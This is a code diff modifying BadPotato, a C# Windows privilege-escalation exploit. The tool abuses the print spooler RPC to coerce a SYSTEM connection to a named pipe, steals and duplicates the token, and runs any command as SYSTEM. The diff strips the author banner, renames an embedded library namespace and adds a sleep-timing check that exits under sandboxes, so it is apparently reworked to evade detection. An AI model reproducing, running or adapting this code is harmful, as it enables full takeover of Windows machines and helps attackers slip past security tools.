@@ -1,4 +1,4 @@
-﻿using PingCastle.RPC;
+﻿using MyCastle.RPC;
 using System;
 using System.Runtime.ConstrainedExecution;
 using System.Runtime.InteropServices;
@@ -6,13 +6,64 @@ using System.Security;
 using System.Security.Principal;
 using System.Text;
 using System.Threading;
-using static PingCastle.RPC.rprn;
+using static MyCastle.RPC.rprn;
 
 namespace BadPotato
 {
 
     class ExecuteRectangle
     {
+        [DllImport("advapi32.dll", SetLastError = true)]
+        public static extern bool SetThreadToken(IntPtr pHandle, IntPtr hToken);
+        [SecurityCritical]
+        [DllImport("kernel32.dll", SetLastError = true)]
+        [return: MarshalAs(UnmanagedType.Bool)]
+        internal static extern bool CloseHandle(IntPtr handle);
+        [DllImport("kernel32.dll", EntryPoint = "GetCurrentThread", CallingConvention = CallingConvention.Cdecl)]
+        public static extern IntPtr GetCurrentThread();
+        [SecurityCritical]
+        [DllImport("kernel32.dll", BestFitMapping = false, CharSet = CharSet.Auto, SetLastError = true)]
+        public static extern IntPtr CreateNamedPipeW(string pipeName, int openMode, int pipeMode, int maxInstances, int outBufferSize, int inBufferSize, int defaultTimeout, ref SECURITY_ATTRIBUTES securityAttributes);
+        [SecurityCritical]
+        [DllImport("kernel32.dll", SetLastError = true)]
+        [return: MarshalAs(UnmanagedType.Bool)]
+        public static extern bool ConnectNamedPipe(IntPtr handle, IntPtr overlapped);
+        [SecurityCritical]
+        [DllImport("kernel32.dll", BestFitMapping = false, CharSet = CharSet.Auto, SetLastError = true)]
+        [return: MarshalAs(UnmanagedType.Bool)]
+        public static extern bool GetNamedPipeHandleState(IntPtr hNamedPipe, IntPtr lpState, IntPtr lpCurInstances, IntPtr lpMaxCollectionCount, IntPtr lpCollectDataTimeout, StringBuilder lpUserName, int nMaxUserNameSize);
+
+        [SecurityCritical]
+        [ReliabilityContract(Consistency.WillNotCorruptState, Cer.MayFail)]
+        [DllImport("advapi32.dll", SetLastError = true)]
+        [return: MarshalAs(UnmanagedType.Bool)]
+        public static extern bool ImpersonateNamedPipeClient(IntPtr hNamedPipe);
+        [SecurityCritical]
+        [ReliabilityContract(Consistency.WillNotCorruptState, Cer.MayFail)]
+        [DllImport("advapi32.dll", SetLastError = true)]
+        [return: MarshalAs(UnmanagedType.Bool)]
+        public static extern bool OpenThreadToken(IntPtr ThreadHandle, long DesiredAccess, bool OpenAsSelf, ref IntPtr TokenHandle);
+        [SecurityCritical]
+        [ReliabilityContract(Consistency.WillNotCorruptState, Cer.MayFail)]
+        [DllImport("advapi32.dll", SetLastError = true)]
+        [return: MarshalAs(UnmanagedType.Bool)]
+        public static extern bool DuplicateTokenEx(IntPtr hExistingToken, long dwDesiredAccess, int lpTokenAttributes, int ImpersonationLevel, int TokenType, ref IntPtr phNewToken);
+        [SecurityCritical]
+        [ReliabilityContract(Consistency.WillNotCorruptState, Cer.MayFail)]
+        [DllImport("userenv.dll", SetLastError = true)]
+        [return: MarshalAs(UnmanagedType.Bool)]
+        public static extern bool CreateEnvironmentBlock(ref IntPtr lpEnvironment, IntPtr hToken, bool bInherit);
+        [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
+        public static extern bool CreateProcessAsUserW(IntPtr hToken, string lpApplicationName, string lpCommandLine, IntPtr lpProcessAttributes, IntPtr lpThreadAttributes, bool bInheritHandles, int dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, ref STARTUPINFO lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);
+        [DllImport("kernel32.dll", SetLastError = true)]
+        public static extern bool CreatePipe(ref IntPtr hReadPipe, ref IntPtr hWritePipe, ref SECURITY_ATTRIBUTES lpPipeAttributes, Int32 nSize);
+        [DllImport("kernel32.dll", SetLastError = true)]
+        public static extern bool SetHandleInformation(IntPtr hObject, int dwMask, int dwFlags);
+        [DllImport("kernel32.dll", SetLastError = true)]
+        public static extern bool ReadFile(IntPtr hFile, byte[] lpBuffer, int nNumberOfBytesToRead, ref int lpNumberOfBytesRead, IntPtr lpOverlapped/*IntPtr.Zero*/);
+        [DllImport("advapi32", SetLastError = true, CharSet = CharSet.Unicode)]
+        public static extern bool CreateProcessWithTokenW(IntPtr hToken, int dwLogonFlags, string lpApplicationName, string lpCommandLine, int dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, [In] ref STARTUPINFO lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);
+
         public struct SECURITY_ATTRIBUTES
         {
            public int nLength;
@@ -49,42 +100,50 @@ namespace BadPotato
             public int dwProcessId;
             public int dwThreadId;
         }
+
+        [DllImport("kernel32.dll")]
+        static extern void Sleep(uint dwMilliseconds);
+
         static void Main(string[] args)
         {
-            Console.WriteLine(@"[*]
 
-    ____            ______        __        __      
-   / __ )____ _____/ / __ \____  / /_____ _/ /_____ 
-  / __  / __ `/ __  / /_/ / __ \/ __/ __ `/ __/ __ \
- / /_/ / /_/ / /_/ / ____/ /_/ / /_/ /_/ / /_/ /_/ /
-/_____/\__,_/\__,_/_/    \____/\__/\__,_/\__/\____/ 
+            DateTime t1 = DateTime.Now;
+            Sleep(2000);
+            double t2 = DateTime.Now.Subtract(t1).TotalSeconds;
+            if (t2 < 1.5)
+            {
+                return;
+            }
 
-Github:https://github.com/BeichenDream/BadPotato/       By:BeichenDream
-            ");
+            Console.WriteLine(@"[*] PrintSpoofer (BadPotato)");
 
             if (args.Length<1)
             {
-                Console.WriteLine("[!] No Command");
+                Console.WriteLine("[!] Usage: BadPotato.exe <command>");
                 return;   
             }
 
+            string lpCommandLine = args[0];
+
             SECURITY_ATTRIBUTES securityAttributes = new SECURITY_ATTRIBUTES();
-            string pipeName = Guid.NewGuid().ToString("N");
+            string pipeUuid = Guid.NewGuid().ToString("N");
+            string pipeName = string.Format("\\\\.\\pipe\\{0}\\pipe\\spoolss", pipeUuid);
+            string connectPipeName = string.Format("\\\\{0}/pipe/{1}", Environment.MachineName, pipeUuid);
 
-            Console.WriteLine("[*] PipeName : " + string.Format("\\\\.\\pipe\\{0}\\pipe\\spoolss", pipeName));
-            Console.WriteLine("[*] ConnectPipeName : " + string.Format("\\\\{0}/pipe/{1}", Environment.MachineName, pipeName));
+            Console.WriteLine("[*] PipeName : " + pipeName);
+            Console.WriteLine("[*] ConnectPipeName : " + connectPipeName);
 
-            IntPtr pipeHandle = CreateNamedPipeW(string.Format("\\\\.\\pipe\\{0}\\pipe\\spoolss", pipeName), 0x00000003| 0x40000000, 0x00000000, 10, 2048, 2048, 0, ref securityAttributes);
+            IntPtr pipeHandle = CreateNamedPipeW(pipeName, 0x00000003|0x40000000, 0x00000000, 10, 2048, 2048, 0, ref securityAttributes);
             if (pipeHandle!=IntPtr.Zero)
             {
-                Console.WriteLine(string.Format("[*] {0} Success! IntPtr:{1}", "CreateNamedPipeW",pipeHandle));
+                Console.WriteLine(string.Format("[*] {0} Success! IntPtr:{1}", "CreateNamedPipeW", pipeHandle));
                 rprn rprn = new rprn();
                 DEVMODE_CONTAINER dEVMODE_CONTAINER = new DEVMODE_CONTAINER();
                 IntPtr rpcPrinterHandle = IntPtr.Zero;
                 rprn.RpcOpenPrinter(string.Format("\\\\{0}", Environment.MachineName), out rpcPrinterHandle, null, ref dEVMODE_CONTAINER, 0);
                 if (rpcPrinterHandle!=IntPtr.Zero)
                 {
-                    if (rprn.RpcRemoteFindFirstPrinterChangeNotificationEx(rpcPrinterHandle, 0x00000100, 0, string.Format("\\\\{0}/pipe/{1}", Environment.MachineName, pipeName), 0) != -1)
+                    if (rprn.RpcRemoteFindFirstPrinterChangeNotificationEx(rpcPrinterHandle, 0x00000100, 0, connectPipeName, 0) != -1)
                     {
                         Console.WriteLine(string.Format("[*] {0} Success! IntPtr:{1}", "RpcRemoteFindFirstPrinterChangeNotificationEx", rpcPrinterHandle));
                         Thread thread = new Thread(() => ConnectNamedPipe(pipeHandle, IntPtr.Zero));
@@ -150,9 +209,7 @@ Github:https://github.com/BeichenDream/BadPotato/       By:BeichenDream
                                             si.hStdOutput = out_write;
                                             si.hStdError = err_write;
                                             si.dwFlags |= 0x00000100;
-
-                                            string lpApplicationName = Environment.SystemDirectory + "/cmd.exe";
-                                            string lpCommandLine = "cmd /c " + args[0];
+                                            
                                             // bool flag=CreateProcessAsUserW(hSystemTokenDup, null, lpCommandLine, IntPtr.Zero, IntPtr.Zero, false, 0, IntPtr.Zero, Environment.SystemDirectory, ref si, out pi);
                                             if (CreateProcessWithTokenW(hSystemTokenDup, 0, null, lpCommandLine, 0x08000000, IntPtr.Zero, Environment.CurrentDirectory, ref si, out pi))
                                             {
@@ -240,55 +297,6 @@ Github:https://github.com/BeichenDream/BadPotato/       By:BeichenDream
                 Console.WriteLine("[!] CreateNamedPipeW fail!") ;
             }
         }
-        [DllImport("advapi32.dll", SetLastError = true)]
-        public static extern bool SetThreadToken(IntPtr pHandle, IntPtr hToken);
-        [SecurityCritical]
-        [DllImport("kernel32.dll", SetLastError = true)]
-        [return: MarshalAs(UnmanagedType.Bool)]
-        internal static extern bool CloseHandle(IntPtr handle);
-        [DllImport("kernel32.dll", EntryPoint = "GetCurrentThread", CallingConvention = CallingConvention.Cdecl)]
-        public static extern IntPtr GetCurrentThread();
-        [SecurityCritical]
-        [DllImport("kernel32.dll", BestFitMapping = false, CharSet = CharSet.Auto, SetLastError = true)]
-        public static extern IntPtr CreateNamedPipeW(string pipeName, int openMode, int pipeMode, int maxInstances, int outBufferSize, int inBufferSize, int defaultTimeout,ref SECURITY_ATTRIBUTES securityAttributes);
-        [SecurityCritical]
-        [DllImport("kernel32.dll", SetLastError = true)]
-        [return: MarshalAs(UnmanagedType.Bool)]
-        public  static extern bool ConnectNamedPipe(IntPtr handle, IntPtr overlapped);
-        [SecurityCritical]
-        [DllImport("kernel32.dll", BestFitMapping = false, CharSet = CharSet.Auto, SetLastError = true)]
-        [return: MarshalAs(UnmanagedType.Bool)]
-        public static extern bool GetNamedPipeHandleState(IntPtr hNamedPipe, IntPtr lpState, IntPtr lpCurInstances, IntPtr lpMaxCollectionCount, IntPtr lpCollectDataTimeout, StringBuilder lpUserName, int nMaxUserNameSize);
-
-        [SecurityCritical]
-        [ReliabilityContract(Consistency.WillNotCorruptState, Cer.MayFail)]
-        [DllImport("advapi32.dll", SetLastError = true)]
-        [return: MarshalAs(UnmanagedType.Bool)]
-        public static extern bool ImpersonateNamedPipeClient(IntPtr hNamedPipe);
-        [SecurityCritical]
-        [ReliabilityContract(Consistency.WillNotCorruptState, Cer.MayFail)]
-        [DllImport("advapi32.dll", SetLastError = true)]
-        [return: MarshalAs(UnmanagedType.Bool)]
-        public static extern bool OpenThreadToken(IntPtr ThreadHandle, long DesiredAccess, bool OpenAsSelf,ref IntPtr TokenHandle);
-        [SecurityCritical]
-        [ReliabilityContract(Consistency.WillNotCorruptState, Cer.MayFail)]
-        [DllImport("advapi32.dll", SetLastError = true)]
-        [return: MarshalAs(UnmanagedType.Bool)]
-        public static extern bool DuplicateTokenEx(IntPtr hExistingToken,long dwDesiredAccess,int lpTokenAttributes,int ImpersonationLevel,int TokenType,ref IntPtr phNewToken);
-        [SecurityCritical]
-        [ReliabilityContract(Consistency.WillNotCorruptState, Cer.MayFail)]
-        [DllImport("userenv.dll", SetLastError = true)]
-        [return: MarshalAs(UnmanagedType.Bool)]
-        public static extern bool CreateEnvironmentBlock(ref IntPtr lpEnvironment,IntPtr hToken,bool bInherit);
-        [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
-        public static extern bool CreateProcessAsUserW(IntPtr hToken, string lpApplicationName, string lpCommandLine, IntPtr lpProcessAttributes, IntPtr lpThreadAttributes,bool bInheritHandles, int dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, ref STARTUPINFO lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);
-        [DllImport("kernel32.dll", SetLastError = true)]
-        public static extern bool CreatePipe(ref IntPtr hReadPipe,ref IntPtr hWritePipe, ref SECURITY_ATTRIBUTES lpPipeAttributes, Int32 nSize);
-        [DllImport("kernel32.dll", SetLastError = true)]
-        public static extern bool SetHandleInformation(IntPtr hObject, int dwMask, int dwFlags);
-        [DllImport("kernel32.dll", SetLastError = true)]
-        public static extern bool ReadFile(IntPtr hFile, byte[] lpBuffer, int nNumberOfBytesToRead, ref int lpNumberOfBytesRead, IntPtr lpOverlapped/*IntPtr.Zero*/);
-        [DllImport("advapi32", SetLastError = true, CharSet = CharSet.Unicode)]
-        public static extern bool CreateProcessWithTokenW(IntPtr hToken, int dwLogonFlags, string lpApplicationName, string lpCommandLine, int dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, [In] ref STARTUPINFO lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);
+        
     }
 }
